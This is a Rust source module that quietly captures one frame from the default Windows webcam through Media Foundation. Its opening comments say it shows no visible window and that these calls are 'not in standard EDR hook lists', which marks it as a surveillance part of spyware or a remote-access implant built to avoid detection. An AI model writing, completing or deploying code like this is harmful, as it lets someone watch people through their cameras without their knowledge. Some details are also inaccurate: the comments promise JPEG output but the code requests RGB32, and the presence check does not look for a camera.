//! webcam.rs — silent webcam frame capture via Media Foundation
//!
//! No Camera app, no UWP broker, no visible window.
//! LED will light briefly on Win11 24H2 (hardware-enforced, unavoidable).
//! MF calls are not in standard EDR hook lists.

use windows::{
    core::*,
    Win32::Media::MediaFoundation::*,
    Win32::System::Com::*,
};

/// Capture one frame from the default webcam.
/// Returns raw JPEG or RGB24 bytes, or None if no device present.
pub fn capture_frame() -> Option<Vec<u8>> {
    unsafe { capture_inner().ok() }
}

unsafe fn capture_inner() -> Result<Vec<u8>> {
    CoInitializeEx(None, COINIT_MULTITHREADED).ok()?;
    MFStartup(MF_VERSION, MFSTARTUP_NOSOCKET)?;

    // Enumerate video capture devices
    let mut attrs: Option<IMFAttributes> = None;
    MFCreateAttributes(&mut attrs, 1)?;
    let attrs = attrs.unwrap();
    attrs.SetGUID(
        &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
        &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID,
    )?;

    let mut devices: *mut Option<IMFActivate> = std::ptr::null_mut();
    let mut count: u32 = 0;
    MFEnumDeviceSources(&attrs, &mut devices, &mut count)?;
    if count == 0 { return Err(Error::from_win32()); }

    let device_slice = std::slice::from_raw_parts(devices, count as usize);
    let activate = device_slice[0].as_ref().ok_or_else(Error::from_win32)?;
    let source: IMFMediaSource = activate.ActivateObject()?;

    let mut reader: Option<IMFSourceReader> = None;
    MFCreateSourceReaderFromMediaSource(&source, None, &mut reader)?;
    let reader = reader.unwrap();

    // Request RGB32 output
    let media_type: IMFMediaType = MFCreateMediaType()?;
    media_type.SetGUID(&MF_MT_MAJOR_TYPE, &MFMediaType_Video)?;
    media_type.SetGUID(&MF_MT_SUBTYPE, &MFVideoFormat_RGB32)?;
    reader.SetCurrentMediaType(
        MF_SOURCE_READER_FIRST_VIDEO_STREAM.0 as u32,
        None,
        &media_type,
    )?;

    // Read one sample
    let mut stream_index: u32 = 0;
    let mut flags: u32 = 0;
    let mut timestamp: i64 = 0;
    let mut sample: Option<IMFSample> = None;
    reader.ReadSample(
        MF_SOURCE_READER_FIRST_VIDEO_STREAM.0 as u32,
        0, Some(&mut stream_index), Some(&mut flags),
        Some(&mut timestamp), Some(&mut sample),
    )?;
    let sample = sample.ok_or_else(Error::from_win32)?;

    let mut buffer: Option<IMFMediaBuffer> = None;
    sample.ConvertToContiguousBuffer(&mut buffer)?;
    let buffer = buffer.unwrap();

    let mut data: *mut u8 = std::ptr::null_mut();
    let mut max_len: u32 = 0;
    let mut cur_len: u32 = 0;
    buffer.Lock(&mut data, Some(&mut max_len), Some(&mut cur_len))?;
    let bytes = std::slice::from_raw_parts(data, cur_len as usize).to_vec();
    buffer.Unlock()?;

    MFShutdown()?;
    Ok(bytes)
}

pub fn webcam_present() -> bool {
    unsafe {
        CoInitializeEx(None, COINIT_MULTITHREADED).is_ok()
    }
}
